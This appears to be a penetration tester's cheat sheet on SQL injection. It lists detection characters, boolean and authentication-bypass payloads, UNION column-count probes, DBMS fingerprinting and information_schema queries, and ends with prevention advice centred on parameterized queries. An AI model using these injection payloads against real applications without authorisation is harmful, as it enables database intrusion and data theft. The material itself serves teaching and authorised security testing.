# SQL Injection Cheat Sheet

#sql-injection #sqli #web-security #pentesting #sql #cheatsheet

## Overview

**SQL Injection (SQLi)** occurs when untrusted user input is incorporated into an SQL query without proper parameterization, allowing the input to alter the intended query logic.

SQLi testing should only be performed against systems you own or are explicitly authorized to assess.

---

## Basic Detection

Start with simple characters that can reveal unsafe query construction:

```text
'
"
`
)
')
")
```

Observe whether the application produces:

* SQL errors
* Different responses
* HTTP 500 errors
* Changed result counts
* Authentication behaviour changes
* Noticeable response-time differences

---

## Boolean-Based Testing

The objective is to determine whether changing a condition changes the application's behaviour.

```sql
' AND 1=1--
' AND 1=2--
```

If the first request behaves normally while the second produces a different response, the parameter may be influencing an SQL query.

Alternative syntax:

```sql
' OR 1=1--
' OR 1=2--
```

---

## Authentication Bypass

A common conceptual test against vulnerable login queries:

```sql
' OR '1'='1'--
```

Another common form:

```sql
' OR 1=1--
```

The exact syntax depends on how the application's original query is constructed and which database engine is being used.

---

## SQL Comments

Comments can terminate the remainder of an application's SQL statement.

### MySQL / PostgreSQL / SQL Server

```sql
--
```

### MySQL

```sql
#
```

### MySQL / PostgreSQL

```sql
/* comment */
```

A space or newline may be required after `--` depending on the database engine.

---

## UNION-Based SQLi

`UNION` combines the results of two compatible `SELECT` statements.

Basic structure:

```sql
' UNION SELECT ...
```

The injected query must generally return the same number of columns as the original query.

### Finding Column Count

One common technique:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Continue increasing the number until the application produces an error.

Another approach:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

The number of `NULL` values is increased until the query succeeds.

---

## Identifying Useful Columns

Once the column count is known:

```sql
' UNION SELECT 'A','B','C'--
```

The response can reveal which columns are reflected by the application.

---

## Database Enumeration

Common database metadata differs between DBMSs.

### MySQL

```sql
SELECT @@version;
SELECT database();
SELECT user();
```

### PostgreSQL

```sql
SELECT version();
SELECT current_database();
SELECT current_user;
```

### SQL Server

```sql
SELECT @@version;
SELECT DB_NAME();
SELECT SYSTEM_USER;
```

### SQLite

```sql
SELECT sqlite_version();
```

---

## MySQL Information Schema

MySQL exposes database metadata through `information_schema`.

Useful tables include:

```text
information_schema.tables
information_schema.columns
```

Example concepts:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = database();
```

```sql
SELECT column_name
FROM information_schema.columns
WHERE table_name = 'users';
```

---

## Error-Based SQLi

Error-based SQLi attempts to make the database return information through an error message.

Look for:

```text
SQL syntax error
Database error
MySQL error
PostgreSQL error
SQL Server error
SQLite error
```

Verbose database errors may disclose:

* DBMS type
* Database version
* Query structure
* Table names
* Column names
* Application source information

---

## Blind SQL Injection

Blind SQLi occurs when the application does not directly return database output.

Instead, information is inferred from observable behaviour.

Two major categories are:

```text
Boolean-Based Blind SQLi

Time-Based Blind SQLi
```

### Boolean-Based

Compare responses to true and false conditions:

```sql
' AND 1=1--
' AND 1=2--
```

### Time-Based

The application is induced to perform a deliberately slow database operation.

Conceptually:

```text
Condition TRUE  → delayed response
Condition FALSE → normal response
```

The exact syntax is DBMS-specific.

---

## DBMS Identification

Useful clues include:

| DBMS       | Common Indicators                 |
| ---------- | --------------------------------- |
| MySQL      | `@@version`, `database()`         |
| PostgreSQL | `version()`, `current_database()` |
| SQL Server | `@@version`, `DB_NAME()`          |
| SQLite     | `sqlite_version()`                |
| Oracle     | `v$version`, `dual`               |

Error messages, syntax differences, and available functions can also help identify the underlying DBMS.

---

## Common SQLi Locations

Test any parameter that may reach a database query:

```text
?id=
?user=
?search=
?category=
?sort=
?order=
?filter=
?name=
?email=
```

Also consider:

```text
POST parameters
JSON parameters
Cookies
HTTP headers
Path parameters
GraphQL arguments
```

---

## Testing Methodology

```text
Identify Input

↓

Test for Errors

↓

Test Boolean Behaviour

↓

Determine Query Structure

↓

Identify DBMS

↓

Determine Column Count

↓

Test UNION / Blind Techniques

↓

Extract Only What Is Necessary

↓

Validate Impact
```

Do not immediately assume that every unusual response is SQL Injection. Confirm that the behaviour is reproducible and caused by the tested input.

---

## SQLi Prevention

The primary defense is **parameterized queries / prepared statements**.

Unsafe conceptual pattern:

```text
SQL Query + User Input
```

Safer architecture:

```text
SQL Query
    +
Parameters
```

Additional protections include:

* Input validation
* Least-privilege database accounts
* Safe ORM usage
* Avoiding dynamic SQL where unnecessary
* Suppressing verbose database errors
* Security testing during development

Escaping input alone should not be considered a substitute for parameterized queries.

---

## Quick Reference

```text
'                       → Basic syntax test

' AND 1=1--             → True condition

' AND 1=2--             → False condition

' OR 1=1--              → Logical condition

' ORDER BY 1--          → Column-count testing

' UNION SELECT NULL--   → UNION column testing

@@version               → MySQL / SQL Server version

database()              → MySQL database

version()               → PostgreSQL version

current_database()      → PostgreSQL database
```

---

## Related Notes

* [[SQL]]
* [[HTTP]]
* [[HTTPS]]
* [[Web-Architecture]]
* [[Burp Suite]]
* [[Burp-Suite-Cheat]]
* [[Websites]]
* [[Sessions]]

## Key Takeaways

SQL Injection is fundamentally a problem of **mixing untrusted input with SQL syntax**. Effective testing requires understanding the application's query structure, identifying the underlying DBMS, and observing how controlled input changes application behaviour.

The most important techniques to recognize are **error-based, boolean-based, UNION-based, and time-based blind SQL Injection**. For defense, parameterized queries and prepared statements are the primary control.
